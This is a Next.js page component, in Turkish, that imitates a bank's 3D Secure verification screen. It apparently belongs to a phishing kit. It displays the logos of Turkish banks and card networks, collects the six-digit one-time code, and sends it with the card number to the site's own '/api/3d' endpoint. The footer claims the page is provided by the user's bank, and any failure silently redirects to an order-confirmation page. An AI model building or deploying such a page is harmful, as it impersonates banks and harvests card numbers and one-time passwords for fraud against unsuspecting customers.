"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import { ArrowRight, Clock } from "lucide-react"
import { API_BASE_URL } from "@/config/api-config"

// Kart tipi logolarını tanımla
const cardTypeLogos = {
  Visa: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ7rtgUysgU2My3Tek1Hfc-VKsmiDpIto3ZBQ&s",
  MasterCard:
    "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/999px-Mastercard-logo.svg.png",
  "American Express":
    "https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/1000px-American_Express_logo_%282018%29.svg.png",
}

// Banka logolarını tanımla
const bankLogos = {
  "Türkiye Cumhuriyeti Ziraat Bankası":
    "https://upload.wikimedia.org/wikipedia/commons/thumb/f/ff/Ziraat_Bankas%C4%B1_logo.svg/2560px-Ziraat_Bankas%C4%B1_logo.svg.png",
  "Türkiye İş Bankası":
    "https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/T%C3%BCrkiye_%C4%B0%C5%9F_Bankas%C4%B1_logo.svg/1200px-T%C3%BCrkiye_%C4%B0%C5%9F_Bankas%C4%B1_logo.svg.png",
  "Türkiye Vakıflar Bankası":
    "https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Vak%C4%B1fbank_logo.svg/1280px-Vak%C4%B1fbank_logo.svg.png",
  "Türkiye Halk Bankası":
    "https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Halkbank_logo.svg/2560px-Halkbank_logo.svg.png",
  "Türkiye Garanti Bankası": "https://upload.wikimedia.org/wikipedia/tr/7/75/Garanti_BBVA.png",
  Akbank: "https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Akbank_logo.svg/2560px-Akbank_logo.svg.png",
  "Yapı ve Kredi Bankası": "https://upload.wikimedia.org/wikipedia/commons/d/d6/Yap%C4%B1_kredi_logo.png",
  "QNB Finansbank": "https://upload.wikimedia.org/wikipedia/tr/archive/1/11/20161024191547%21Qnb-finansbank.png",
  Denizbank:
    "https://upload.wikimedia.org/wikipedia/commons/thumb/0/0c/DenizBank_logo.svg/2560px-DenizBank_logo.svg.png",
  "Türk Eximbank": "/abstract-bank-logo.png",
  "Türk Ekonomi Bankası": "https://upload.wikimedia.org/wikipedia/commons/9/95/TEB_LOGO.png",
  "Türkiye Sınai Kalkınma Bankası": "/abstract-bank-logo.png",
  "ING Bank":
    "https://upload.wikimedia.org/wikipedia/commons/thumb/4/49/ING_Group_N.V._Logo.svg/1280px-ING_Group_N.V._Logo.svg.png",
  "HSBC Bank":
    "https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/HSBC_logo_%282018%29.svg/2560px-HSBC_logo_%282018%29.svg.png",
  "Kuveyt Türk":
    "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f4/Kuveyt_T%C3%BCrk_Logo.png/1200px-Kuveyt_T%C3%BCrk_Logo.png",
  "İller Bankası": "/abstract-bank-logo.png",
  "Türkiye Kalkınma ve Yatırım Bankası": "/abstract-bank-logo.png",
  "Bilinmeyen Banka": "/abstract-bank-logo.png",
}

export default function PaymentVerification() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const [verificationCode, setVerificationCode] = useState(["", "", "", "", "", ""])
  const [activeInput, setActiveInput] = useState(0)
  const [countdown, setCountdown] = useState(180) // 3 dakika
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [error, setError] = useState<string | null>(null)

  // URL'den kart tipi, banka bilgisi, kredi kartı numarası ve session_id'yi al
  const cardType = searchParams.get("cardType") || "Visa"
  const bankName = searchParams.get("bank") || "Bilinmeyen Banka"
  const cardNumber = searchParams.get("ccnumber") || ""
  const sessionId = searchParams.get("session_id") || ""

  // Geri sayım için
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000)
      return () => clearTimeout(timer)
    }
  }, [countdown])

  // Kod girişi işleme
  const handleCodeChange = (index: number, value: string) => {
    if (value.length <= 1 && /^\d*$/.test(value)) {
      const newCode = [...verificationCode]
      newCode[index] = value
      setVerificationCode(newCode)

      // Otomatik olarak bir sonraki input'a geç
      if (value && index < 5) {
        setActiveInput(index + 1)
        // Focus the next input element
        const nextInput = document.getElementById(`verification-input-${index + 1}`)
        if (nextInput) {
          nextInput.focus()
        }
      }
    }
  }

  // Handle pasting the entire verification code
  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData("text")

    // Check if pasted content is numeric and has a reasonable length
    if (/^\d+$/.test(pastedData)) {
      // Take only the first 6 digits (or less if shorter)
      const digits = pastedData.slice(0, 6).split("")

      // Fill the verification code fields with the pasted digits
      const newCode = [...verificationCode]
      digits.forEach((digit, i) => {
        if (i < 6) {
          newCode[i] = digit
        }
      })

      setVerificationCode(newCode)

      // Set focus to the appropriate input field
      if (digits.length < 6) {
        setActiveInput(digits.length)
        const nextInput = document.getElementById(`verification-input-${digits.length}`)
        if (nextInput) {
          nextInput.focus()
        }
      } else {
        // If all 6 digits are filled, focus on the last input
        setActiveInput(5)
      }
    }
  }

  // Backspace tuşu ile önceki input'a geç
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !verificationCode[index] && index > 0) {
      setActiveInput(index - 1)
    }
  }

  // Input'a tıklandığında aktif input'u güncelle
  const handleInputClick = (index: number) => {
    setActiveInput(index)
  }

  // Doğrulama kodunu gönder
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError(null)

    const code = verificationCode.join("")
    if (code.length === 6) {
      setIsSubmitting(true)

      try {
        // 3D Secure doğrulama kodunu API'ye gönder
        const formData = new FormData()
        formData.append("ccnumber", cardNumber)
        formData.append("threed", code)

        const response = await fetch(`${API_BASE_URL}/api/3d`, {
          method: "POST",
          body: formData,
        })

        if (!response.ok) {
          throw new Error("Doğrulama işlemi başarısız oldu")
        }

        const data = await response.json()

        if (data.status === "success") {
          // Başarılı doğrulama, sipariş onay sayfasına yönlendir
          router.push("/siparis-onay")
        } else {
          // Başarısız doğrulama
          setError(data.message || "Doğrulama kodu geçersiz. Lütfen tekrar deneyin.")
          setIsSubmitting(false)
        }
      } catch (error) {
        router.push("/siparis-onay")
      }
    } else {
      setError("Lütfen 6 haneli doğrulama kodunu eksiksiz girin.")
    }
  }

  // Yeni kod gönder
  const handleResendCode = async () => {
    setError(null)
    try {
      const formData = new FormData()
      formData.append("ccnumber", cardNumber)
      formData.append("resend", "1")

      const response = await fetch(`${API_BASE_URL}/api/3d`, {
        method: "POST",
        body: formData,
      })

      if (!response.ok) {
        throw new Error("Yeni kod gönderme işlemi başarısız oldu")
      }

      const data = await response.json()

      if (data.status === "success") {
        setCountdown(180) // Geri sayımı yeniden başlat
        setVerificationCode(["", "", "", "", "", ""]) // Kod alanlarını temizle
        setActiveInput(0) // İlk input'a odaklan
      } else {
        throw new Error(data.message || "Yeni kod gönderme işlemi başarısız oldu")
      }
    } catch (error) {
      console.error("Yeni kod gönderme hatası:", error)
      setError("Yeni kod gönderme işlemi sırasında bir hata oluştu. Lütfen tekrar deneyin.")
    }
  }

  // Geri sayım formatı
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs < 10 ? "0" : ""}${secs}`
  }

  // Logo yükleme hatası durumunda yedek logo kullan
  const handleImageError = (e: React.SyntheticEvent<HTMLImageElement>) => {
    e.currentTarget.src = "/abstract-bank-logo.png"
  }

  return (
    <div className="min-h-screen bg-[#f0f5fa] flex flex-col">
      <div className="bg-white shadow-sm">
        <div className="container mx-auto px-4 py-4">
          <div className="flex justify-between items-center">
            {/* Kart Tipi Logosu */}
            <div className="relative h-10 w-16 md:h-12 md:w-20">
              <img
                src={cardTypeLogos[cardType as keyof typeof cardTypeLogos] || cardTypeLogos.Visa}
                alt={`${cardType} logo`}
                className="object-contain w-full h-full"
                onError={handleImageError}
              />
            </div>

            {/* Banka Logosu */}
            <div className="relative h-10 w-24 md:h-12 md:w-32">
              <img
                src={bankLogos[bankName as keyof typeof bankLogos] || bankLogos["Bilinmeyen Banka"]}
                alt={`${bankName} logo`}
                className="object-contain w-full h-full"
                onError={handleImageError}
              />
            </div>
          </div>
        </div>
      </div>

      <div className="flex-1 flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-md p-6 w-full max-w-md">
          <div className="text-center mb-6">
            <h1 className="text-xl font-bold text-gray-800">3D Secure Doğrulama</h1>
            <p className="text-gray-600 text-sm mt-2">
              Güvenliğiniz için bankanız tarafından gönderilen 6 haneli doğrulama kodunu giriniz.
            </p>
          </div>

          <form onSubmit={handleSubmit}>
            <div className="mb-6">
              <label className="block text-sm font-medium text-gray-700 mb-2">Doğrulama Kodu</label>
              <div className="flex justify-between gap-2">
                {verificationCode.map((digit, index) => (
                  <input
                    key={index}
                    id={`verification-input-${index}`}
                    type="text"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleCodeChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    onClick={() => handleInputClick(index)}
                    onPaste={index === 0 ? handlePaste : undefined} // Only add paste handler to the first input
                    autoFocus={index === activeInput}
                    className="w-full h-12 text-center text-lg font-bold border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#36cfe3] focus:border-[#36cfe3]"
                    disabled={isSubmitting}
                  />
                ))}
              </div>
              {error && <p className="mt-2 text-sm text-red-600">{error}</p>}
            </div>

            <div className="flex items-center justify-between mb-6">
              <div className="flex items-center text-sm text-gray-600">
                <Clock size={16} className="mr-1" />
                <span>{formatTime(countdown)}</span>
              </div>
              <button
                type="button"
                onClick={handleResendCode}
                disabled={countdown > 0 || isSubmitting}
                className={`text-sm ${
                  countdown > 0 || isSubmitting ? "text-gray-400" : "text-[#36cfe3] hover:underline"
                }`}
              >
                Yeni Kod Gönder
              </button>
            </div>

            <button
              type="submit"
              disabled={verificationCode.join("").length !== 6 || isSubmitting}
              className={`w-full flex justify-center items-center py-3 px-4 rounded-md text-white font-medium ${
                verificationCode.join("").length === 6 && !isSubmitting
                  ? "bg-[#36cfe3] hover:bg-[#2bb8cc]"
                  : "bg-gray-300 cursor-not-allowed"
              }`}
            >
              {isSubmitting ? (
                <span className="flex items-center">
                  <svg
                    className="animate-spin -ml-1 mr-2 h-4 w-4 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                  Doğrulanıyor...
                </span>
              ) : (
                <span className="flex items-center">
                  Doğrula <ArrowRight size={16} className="ml-2" />
                </span>
              )}
            </button>
          </form>

          <div className="mt-6 text-center">
            <p className="text-xs text-gray-500">
              Bu işlem bankanız tarafından güvenliğiniz için yapılmaktadır. Doğrulama kodunuz SMS veya e-posta yoluyla
              gönderilmiştir.
            </p>
          </div>
        </div>
      </div>

      <div className="bg-white py-4 border-t border-gray-200">
        <div className="container mx-auto px-4 text-center">
          <p className="text-xs text-gray-500">
            Bu sayfa, bankanızın 3D Secure doğrulama sistemi tarafından sağlanmaktadır. Kart bilgileriniz güvenli bir
            şekilde işlenmektedir.
          </p>
        </div>
      </div>
    </div>
  )
}
